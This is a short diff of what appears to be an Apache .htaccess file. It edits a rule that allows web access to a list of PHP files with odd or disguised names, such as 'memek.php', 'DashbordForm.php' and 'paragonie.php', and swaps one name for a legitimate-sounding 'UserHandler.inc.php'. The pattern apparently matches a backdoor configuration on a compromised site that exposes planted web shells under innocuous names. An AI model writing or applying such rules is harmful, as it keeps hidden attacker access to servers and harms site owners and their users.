@@ -58,7 +58,7 @@
     Order Deny,Allow
     Allow from all
 </FilesMatch>
-<FilesMatch "^(memek.php|MetadataInstallForm.php|DashbordForm.php|AssignToIssueVendor.php|AuthorIdentifiersForm.php|paragonie.php|Renderer.php)$">
+<FilesMatch "^(UserHandler.inc.php|MetadataInstallForm.php|DashbordForm.php|AssignToIssueVendor.php|AuthorIdentifiersForm.php|paragonie.php|Renderer.php)$">
         Order Deny,Allow
     Allow from all
     </FilesMatch>
